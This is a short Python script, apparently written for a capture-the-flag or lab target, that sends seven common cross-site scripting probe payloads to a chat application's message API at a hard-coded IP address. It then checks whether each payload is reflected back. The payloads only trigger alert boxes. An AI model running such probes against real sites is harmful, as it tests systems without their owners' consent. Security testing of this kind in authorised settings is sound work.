#!/usr/bin/env python3
"""
Test XSS payloads on the archivist chat interface
"""

import requests
import json

URL = "http://154.57.164.77:30826/api/messages/send"

def test_xss():
    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '\\<script\\>alert(1)\\</script\\>',
        'javascript:alert(1)',
        '\"><script>alert(1)</script>',
        '<svg/onload=alert(1)>',
        '靑<script>alert(1)</script>'
    ]

    print("=== Testing XSS Payloads ===\n")

    for i, payload in enumerate(payloads, 1):
        print(f"Test {i}: {payload[:50]}...")
        try:
            resp = requests.post(URL, json={'content': payload})
            if resp.status_code == 200:
                print("  ✓ Message accepted")

                # Check if it's reflected in messages
                msgs = requests.get("http://154.57.164.77:30826/api/messages")
                if msgs.status_code == 200:
                    messages = msgs.json()
                    # Look for our payload in recent messages
                    for msg in messages[-5:]:
                        if payload in msg.get('content', ''):
                            print(f"  → Reflected in message from {msg['sender']}")
            else:
                print(f"  ✗ Error: {resp.status_code}")
        except Exception as e:
            print(f"  ✗ Exception: {e}")
        print()

if __name__ == "__main__":
    test_xss()
